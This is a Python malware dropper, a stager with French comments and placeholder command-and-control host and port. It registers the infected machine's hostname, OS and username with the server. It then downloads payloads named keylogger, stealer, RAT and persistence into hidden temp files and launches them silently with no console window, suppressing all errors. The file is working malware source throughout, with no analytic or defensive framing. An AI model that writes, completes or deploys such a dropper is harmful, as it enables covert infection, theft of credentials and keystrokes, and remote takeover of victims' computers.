#!/usr/bin/env python3
"""
payloads/dropper.py — stager chain
Enregistre le bot, télécharge et exécute keylogger + stealer + rat + persistence
Variables injectées : FILL_C2_HOST, FILL_PORT, FILL_C2_URL
"""
import urllib.request, os, stat, tempfile, subprocess, platform, socket, json

C2     = "http://FILL_C2_HOST:FILL_PORT"
BOT_ID = socket.gethostname()
PY     = "python3" if platform.system() != "Windows" else "python"
FLAGS  = 0x08000000 if platform.system() == "Windows" else 0

def _post(url, data):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def register():
    _post(f"{C2}/c2/register", {
        "id":   BOT_ID,
        "os":   platform.platform(),
        "user": os.getlogin(),
    })

def fetch_and_exec(name: str):
    url  = f"{C2}/payload?name={name}"
    dest = os.path.join(tempfile.gettempdir(), f".fl_{name}.py")
    try:
        urllib.request.urlretrieve(url, dest)
        os.chmod(dest, stat.S_IRWXU)
        subprocess.Popen(
            [PY, dest],
            close_fds=True,
            creationflags=FLAGS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass

register()
for p in ["stealer", "persistence", "rat", "keylogger"]:
    fetch_and_exec(p)